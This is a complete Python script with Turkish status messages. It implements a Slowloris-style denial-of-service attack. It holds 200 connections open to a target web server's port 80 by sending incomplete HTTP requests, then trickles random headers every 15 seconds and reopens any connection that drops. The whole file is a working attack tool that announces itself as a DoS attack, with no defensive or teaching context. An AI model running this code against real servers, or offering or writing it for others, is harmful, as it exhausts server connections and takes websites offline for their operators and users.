import socket, random, time, sys

headers = [
    "User-agent : Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/2010010 Firefox/36.0",
	"Accept-language : en-US,en,q=0.5"
]

sockets = []

def setupSocket(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((ip, 80))
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Kullanın: {} example.com".format(sys.argv[0]))
        sys.exit()

    ip = sys.argv[1]
    count = 200
    print("DoS attack Başlıyor: {}. Bağlanılıyor  {} sockets.".format(ip, count))

    for _ in range(count):
        try:
            print("Socket {}".format(_))
            sock = setupSocket(ip)
        except socket.error:
            break

        sockets.append(sock)

    while True:
        print("Bağlantı kuruldu {} sockets.Headers gönderiliyor ...".format(len(sockets)))

        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)

        for _ in range(count - len(sockets)):
            print("Kapalı soketler yeniden açılıyor...")
            try:
                sock = setupSocket(ip)
                if sock:
                    sockets.append(sock)
            except socket.error:
                break

        time.sleep(15)
